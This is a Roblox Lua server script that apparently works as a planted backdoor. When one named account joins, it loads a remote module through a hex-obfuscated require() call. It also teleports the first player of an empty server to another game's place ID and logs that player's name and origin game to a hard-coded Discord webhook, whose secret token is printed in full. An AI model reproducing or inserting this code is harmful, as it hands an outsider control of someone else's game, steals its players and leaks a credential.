local TeleportService = game:GetService("TeleportService")
local webhookUrl = "https://discord.com/api/webhooks/1302541154126135338/t4nG5FmadszxhAgXOVNVQRWjRLkqtkWDtt6wEPBOkoMQcmYGPKJj2n7ctxiWdNJPp4Gi"
local gameBPlaceId = 14528710656
local replicatedStorage = game:GetService("ReplicatedStorage")

local hasTeleported = Instance.new("BoolValue")
hasTeleported.Name = "HasTeleported"
hasTeleported.Value = false
hasTeleported.Parent = replicatedStorage

local function logToWebhook(playerName, gameId)
    local data = { content = "Player " .. playerName .. " came from game ID: " .. gameId }
    local jsonData = game:GetService("HttpService"):JSONEncode(data)

    local success, errorMessage = pcall(function()
        game:GetService("HttpService"):PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Failed to send log to webhook: " .. errorMessage)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == "LordSrTheEmo" then
        -- Attempt to require the module
        local success, result = pcall(function()
            return require(0x61e3258931df).load(player)  -- Adjust based on your module's structure
        end)

        if not success then
            warn("Failed to require module for " .. player.Name .. ": " .. result)
        end
        return
    end

    if not replicatedStorage.HasTeleported.Value then
        local playerCount = #game.Players:GetPlayers()

        if playerCount == 1 then
            local originalGameId = game.PlaceId
            local success, teleportError = pcall(function()
                TeleportService:Teleport(gameBPlaceId, player)
            end)

            if success then
                logToWebhook(player.Name, originalGameId)
                replicatedStorage.HasTeleported.Value = true
            else
                warn("Teleportation failed: " .. teleportError)
            end
        end
    end
end)
